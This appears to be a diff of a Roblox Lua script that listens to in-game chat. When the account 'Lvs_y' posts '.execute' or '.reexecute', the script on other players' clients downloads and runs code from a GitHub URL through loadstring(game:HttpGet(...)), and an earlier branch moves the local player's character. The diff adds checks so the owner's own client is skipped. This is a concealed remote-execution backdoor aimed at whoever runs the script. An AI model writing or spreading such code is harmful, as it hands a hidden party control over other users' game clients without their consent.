@@ -778,8 +778,14 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFi
             game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position, position + direction)
         end
     elseif H.FromSpeaker == "Lvs_y" and H.Message == ".execute" then
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Lvsyyy/Fun/main/Execute%20Test"))()
     elseif H.FromSpeaker == "Lvs_y" and H.Message == ".reexecute" then
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Lvsyyy/UI/main/Vyxen%20no%20cmds"))()
     end
 end)
